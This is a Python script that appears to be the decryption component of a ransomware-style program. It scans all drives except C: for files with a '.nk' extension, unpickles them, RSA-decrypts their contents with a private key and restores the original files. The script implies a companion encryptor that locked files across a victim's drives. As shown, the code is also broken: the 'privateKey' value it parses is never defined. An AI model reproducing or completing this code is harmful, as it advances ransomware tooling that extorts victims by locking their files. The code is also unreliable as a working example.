import os
import rsa
import pickle

t = privateKey.split(', ')
n = int((t[0])[11:])
e = int(t[1])
d = int(t[2])
p = int(t[3])
q = int((t[4])[:-1])

def decrypt():
    global privateKey

    pk = rsa.key.PrivateKey(n, e, d, p, q)

    for part in range(65, 91):
        if part != 67:
            partpath = chr(part) + ":\\"
            for dirpath, dirs, files in os.walk(partpath, topdown = True):
                dirpath = dirpath + "\\"
                for filename in files:
                    fname = dirpath + filename
                    chk = ".nk"
                    if fname[-3:] == chk:
                        nfname = fname[:-3]
                        try:
                            with open(fname, 'rb') as f:
                                data = pickle.load(f)
                            os.rename(fname, nfname)
                            with open(nfname, 'wb') as f:
                                pass
                            for i in range(len(data)):
                                pt = rsa.decrypt(data[i], pk)
                                with open(nfname, 'ab') as f:
                                    f.write(pt)
                        except:
                            pass

decrypt()
